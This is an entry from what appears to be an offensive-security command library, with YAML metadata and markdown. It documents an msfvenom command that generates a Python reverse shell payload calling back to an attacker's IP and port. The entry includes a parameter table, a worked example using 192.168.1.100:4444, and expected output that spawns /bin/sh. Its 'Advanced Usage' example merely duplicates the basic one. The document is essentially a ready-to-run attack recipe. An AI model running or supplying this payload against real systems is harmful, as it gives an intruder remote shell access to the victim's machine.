---
id: cb86159e-9ce1-4233-bf6f-da79c5c23ac2
name: generate-python-reverse-shell-payload
type: command
executor: bash
data: >-
  msfvenom -p cmd/unix/reverse_python LHOST="$_LHOST" LPORT=$_LPORT -f raw >
  shell.py
output: null
created_at: '2023-04-06T03:56:24.923690+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Linux
  - Unix
tags:
  - reverse-shell
  - python
verified: true
validated: true
---

# Generate Python Reverse Shell Payload

## Command

```bash
msfvenom -p cmd/unix/reverse_python LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.py
```

## Description

Produces a Python script for reverse shell using socket and subprocess on Unix.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p cmd/unix/reverse_python | Python reverse payload | Built-in |
| -f raw | Raw Python script | Built-in |
| > shell.py | Save to shell.py | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p cmd/unix/reverse_python LHOST="192.168.1.100" LPORT=4444 -f raw > shell.py
```

### Advanced Usage

```bash
msfvenom -p cmd/unix/reverse_python LHOST="192.168.1.100" LPORT=4444 -f raw > shell.py
```

## Expected Output

shell.py with import socket, subprocess.call(['/bin/sh']) etc.

## Related

- [[commands/generate-perl-reverse-shell-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
